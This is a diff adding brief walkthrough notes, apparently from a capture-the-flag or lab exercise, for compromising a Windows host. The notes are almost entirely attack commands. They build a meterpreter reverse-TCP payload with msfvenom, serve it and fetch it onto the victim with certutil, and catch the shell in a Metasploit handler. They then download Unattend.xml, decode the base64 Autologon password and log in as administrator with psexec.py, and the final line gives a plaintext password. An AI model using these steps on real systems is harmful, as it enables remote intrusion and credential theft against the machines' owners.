@@ -1,0 +1,24 @@
+- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.28.2 LPORT=4444 -f exe -o payload.exe
+- python -m SimpleHTTPServer 80
+- on the victim shell
+    - certutil -urlcache -f http://10.10.28.2/payload.exe payload.exe
+- on the attacker shell : 
+    - msfconsole
+    - use multi/handler
+    - set payload windows/x64/meterpreter/reverse_tcp
+    - set LHOST 10.10.28.2
+    - set LPORT 4444
+    - run
+- on the meterpreter session : 
+    - search -f Unattend.xml
+    - cd C:\\
+    - cd Windows
+    - cd Panther
+    - download unattend.xml
+- on ataccker shell
+    - cat unattend.xml
+    - in the Autologon file tag, there is the password that is password encoded in base64
+    - echo PASSWORD > password.txt
+    - base64 -d password.txt
+    - psexec.py administrator@VICTIM_IP 
+Admin@123
